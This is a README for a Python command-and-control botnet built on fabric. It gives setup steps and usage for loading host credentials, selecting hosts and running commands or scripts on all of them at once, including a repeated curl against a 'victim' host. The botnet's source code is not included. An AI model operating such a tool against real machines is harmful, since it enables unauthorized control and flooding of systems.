# CnC-Botnet-in-Python
C&#38;C Botnet written in Python

## Description
Simple botnet written in Python using fabric. 
<p>
The author is not responsible for the use of this code.

## Set up
- Create a python env and install requirements
```sh
python3 -m venv botnet-env
source botnet-env/bin/activate
pip install -r requirements.txt
```
- To run the script, create a `hosts.txt` by copying the `hosts.txt.sample`
```sh
cp hosts.txt.sample hosts.txt
# Then modify...
```
- Write out the hosts you want to run the C&C botnet.

## Running the botnet

- Listing all the commands
```sh
fab -l
# Which shows this:
Available tasks:

  add-host         Add a new host to the state.
  execute-script   Execute a script file on all selected hosts.
  list-hosts       List all loaded hosts.
  load-hosts       Load hosts and passwords into state from hosts.txt.
  run-command      Run a command on all selected hosts.
  select-hosts     Select specific hosts to execute commands.
```
- Use `load-hosts` to load hosts from `hosts.txt` to `hosts_state.json`

- Use `select-hosts` to select specific hosts to run commands or scripts.

- Use `add-hosts` to add a new host directly.
```sh
fab add-host --host "username@host" --password "password"
```

- The current selected hosts are saved to `hosts_state.json`.

- Use `run-command` to execute a command on the hosts in `hosts_state.json`
```sh
# Example
fab run-command --command "curl http://static-victim:8081" --repetitions 2 --interval 1
```
Parameters:
- **command**: The command to execute.
- **repetitions**: Number of times to repeat the command (default: 1).
- **interval**: Delay (in seconds) between repetitions (default: 1).

## Docker
```sh
# Building the container
docker build -t fab-botnet .   
# Running the container
# Connecting the container to the network
docker run -d --name fab-botnet --network chn-network fab-botnet
```

## Other
Newer cryptography libraries may require `rust` depending on the system.
